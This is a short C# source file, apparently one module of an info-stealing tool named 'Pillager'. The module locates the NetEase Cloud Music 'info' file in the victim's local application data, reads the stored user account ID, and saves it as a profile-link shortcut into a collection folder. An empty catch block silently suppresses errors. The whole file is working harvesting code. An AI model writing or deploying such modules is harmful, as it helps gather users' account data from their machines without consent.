using Pillager.Helper;
using System;
using System.IO;
using System.Text;

namespace Pillager.Softwares
{
    internal class NeteaseCloudMusic : ICommand
    {
        public override void Save(string path)
        {
            try
            {
                string infopath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\CloudMusic\\info");
                string info = File.ReadAllText(infopath);
                if (string.IsNullOrEmpty(info)) return;
                string savepath = Path.Combine(path, "NeteaseCloudMusic");
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, "userinfo.url"), " [InternetShortcut]\r\nURL=https://music.163.com/#/user/home?id=" + info, Encoding.UTF8);
            }
            catch { }
        }
    }
}
